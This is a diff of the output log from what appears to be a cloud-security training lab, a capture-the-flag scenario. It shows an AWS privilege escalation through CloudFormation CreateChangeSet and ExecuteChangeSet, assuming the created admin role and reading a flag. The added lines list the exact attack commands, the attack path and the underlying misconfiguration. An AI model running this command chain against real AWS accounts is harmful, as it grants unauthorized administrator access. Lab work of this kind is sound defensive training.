@@ -39,7 +39,7 @@ Stack details:
 |                          DescribeStacks                          |
 +------------------------------------------------------------------+
 |  pl-prod-cloudformation-005-to-admin-target-stack                |
-|  CREATE_COMPLETE                                                 |
+|  UPDATE_ROLLBACK_COMPLETE                                        |
 |  Initial CloudFormation stack for privilege escalation scenario  |
 +------------------------------------------------------------------+
 
@@ -76,7 +76,7 @@ ChangeSet name: pl-prod-cloudformation-005-escalation-changeset
 
 [0;36m[Attacker] $ aws cloudformation create-change-set --region us-east-1 --stack-name pl-prod-cloudformation-005-to-admin-target-stack --change-set-name pl-prod-cloudformation-005-escalation-changeset --template-body file:///tmp/malicious-changeset-template.json --capabilities CAPABILITY_NAMED_IAM --change-set-type UPDATE --description "Escalation via CreateChangeSet - adds admin role"[0m
 {
-    "Id": "arn:aws:cloudformation:us-east-1:123456789012:changeSet/pl-prod-cloudformation-005-escalation-changeset/457519f2-f21d-40d3-922b-fc594b7e62c2",
+    "Id": "arn:aws:cloudformation:us-east-1:123456789012:changeSet/pl-prod-cloudformation-005-escalation-changeset/bf46e64f-e2b2-461a-9f42-95170d62f745",
     "StackId": "arn:aws:cloudformation:us-east-1:123456789012:stack/pl-prod-cloudformation-005-to-admin-target-stack/6f87b710-3a3c-11f1-8da9-0affc1a85345"
 }
 [0;32m✓ ChangeSet creation initiated[0m
@@ -114,11 +114,92 @@ The stack's admin service role will create the escalated role
 [1;33mStep 10: Verifying escalated role was created[0m
 Role ARN: arn:aws:iam::123456789012:role/pl-prod-cloudformation-005-to-admin-escalated-role
 [2m[ReadOnly] $ aws iam get-role --role-name pl-prod-cloudformation-005-to-admin-escalated-role[0m
-[0;31m✗ Escalated role not found[0m
+[0;32m✓ Escalated role exists[0m
 
-[1;33m[demo_permissions] Script interrupted, restoring permissions...[0m
+[1;33mStep 11: Assuming the escalated admin role[0m
+Using sts:AssumeRole to get admin credentials...
+
+
+[0;36m[Attacker] $ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/pl-prod-cloudformation-005-to-admin-escalated-role --role-session-name escalation-demo-session --query 'Credentials' --output json[0m
+[2m[Attacker] $ aws sts get-caller-identity --query 'Arn' --output text[0m
+Current identity: arn:aws:sts::123456789012:assumed-role/pl-prod-cloudformation-005-to-admin-escalated-role/escalation-demo-session
+[0;32m✓ Successfully assumed escalated admin role[0m
+
+[1;33mStep 12: Verifying administrator access[0m
+Attempting to list IAM users (using assumed escalated role credentials)...
+[2m[Attacker] $ aws iam list-users --max-items 3 --output table[0m
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+|                                                                                    ListUsers                                                                                   |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+|  NextToken                 |  eyJNYXJrZXIiOiBudWxsLCAiYm90b190cnVuY2F0ZV9hbW91bnQiOiAzfQ==                                                                                     |
++----------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------+
+||                                                                                     Users                                                                                    ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||                             Arn                             |      CreateDate       |   PasswordLastUsed    | Path  |        UserId          |           UserName            ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582225 |  2026-03-03T23:57:05Z |                       |  /    |  AIDA2E4JP2KMDN764OVDX |  pathrunner-admin-1772582225  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582487 |  2026-03-04T00:01:27Z |                       |  /    |  AIDA2E4JP2KMIGZOBA63O |  pathrunner-admin-1772582487  ||
+||  arn:aws:iam::123456789012:user/pathrunner-admin-1772582552 |  2026-03-04T00:02:32Z |  2026-03-04T00:04:42Z |  /    |  AIDA2E4JP2KMGNBJR4AJO |  pathrunner-admin-1772582552  ||
+|+-------------------------------------------------------------+-----------------------+-----------------------+-------+------------------------+-------------------------------+|
+[0;32m✓ Successfully listed IAM users![0m
+[0;32m✓ ADMIN ACCESS CONFIRMED[0m
+
+[1;33mStep 13: Capturing CTF flag from SSM Parameter Store[0m
+
+[0;36m[Attacker (now admin)] $ aws ssm get-parameter --name /pathfinding-labs/flags/cloudformation-005-to-admin --query 'Parameter.Value' --output text[0m
+[0;32m✓ Flag captured: flag{cloudformation_005_admin_captured}[0m
+
 [1;33m[demo_permissions] Restoring helpful permissions...[0m
   Restored user: pl-prod-cloudformation-005-to-admin-starting-user
 [0;32m[demo_permissions] Helpful permissions restored[0m
 
-Waiter StackUpdateComplete failed: Waiter encountered a terminal failure state: For expression "Stacks[].StackStatus" we matched expected path: "UPDATE_ROLLBACK_COMPLETE" at least once
+[0;32m========================================[0m
+[0;32m✅ CTF FLAG CAPTURED![0m
+[0;32m========================================[0m
+
+[1;33mAttack Summary:[0m
+1. Started as: pl-prod-cloudformation-005-to-admin-starting-user (limited permissions)
+2. Discovered existing CloudFormation stack with admin service role
+3. Created malicious template with admin role
+4. Used cloudformation:CreateChangeSet to prepare stack modification
+5. Viewed ChangeSet details to confirm changes
+6. Used cloudformation:ExecuteChangeSet to apply the changes
+7. Stack's admin service role created the escalated role
+8. Assumed the newly created escalated admin role
+9. Achieved: Full administrator access
+10. Captured CTF flag from SSM Parameter Store: flag{cloudformation_005_admin_captured}
+
+[1;33mAttack Path:[0m
+  pl-prod-cloudformation-005-to-admin-starting-user → (cloudformation:CreateChangeSet + ExecuteChangeSet)
+  → Stack (admin service role) → Creates pl-prod-cloudformation-005-to-admin-escalated-role
+  → (sts:AssumeRole) → Admin Access
+  → (ssm:GetParameter) → CTF Flag
+
+[1;33mAttack Commands:[0m
+  [0;36m$ aws cloudformation create-change-set --region us-east-1 --stack-name pl-prod-cloudformation-005-to-admin-target-stack --change-set-name pl-prod-cloudformation-005-escalation-changeset --template-body file:///tmp/malicious-changeset-template.json --capabilities CAPABILITY_NAMED_IAM --change-set-type UPDATE --description "Escalation via CreateChangeSet - adds admin role"[0m
+  [0;36m$ aws cloudformation execute-change-set --region us-east-1 --stack-name pl-prod-cloudformation-005-to-admin-target-stack --change-set-name pl-prod-cloudformation-005-escalation-changeset[0m
+  [0;36m$ aws sts assume-role --role-arn arn:aws:iam::123456789012:role/pl-prod-cloudformation-005-to-admin-escalated-role --role-session-name escalation-demo-session --query 'Credentials' --output json[0m
+  [0;36m$ aws ssm get-parameter --name /pathfinding-labs/flags/cloudformation-005-to-admin --query 'Parameter.Value' --output text[0m
+
+[1;33mAttack Artifacts:[0m
+- Escalated admin role: pl-prod-cloudformation-005-to-admin-escalated-role
+- Modified CloudFormation stack: pl-prod-cloudformation-005-to-admin-target-stack
+- Executed ChangeSet: pl-prod-cloudformation-005-escalation-changeset
+- Template file: /tmp/malicious-changeset-template.json
+
+[1;33mKey Vulnerability:[0m
+The CloudFormation stack has an administrative service role, and the user
+can create and execute ChangeSets on the stack. This allows creating any
+resource the service role has permissions for, including IAM roles with
+trust policies that grant access back to the attacker.
+
+[1;33mDifference from UpdateStack:[0m
+Unlike UpdateStack which requires the full permission, CreateChangeSet and
+ExecuteChangeSet allow more granular control. Many organizations grant these
+permissions separately, thinking it provides better oversight. However, both
+permissions together allow the same privilege escalation as UpdateStack.
+
+[0;31m⚠ Warning: The escalated role and modified stack remain active[0m
+[1;33mTo clean up and restore the original state:[0m
+  ./cleanup_attack.sh or use the plabs TUI/CLI
+
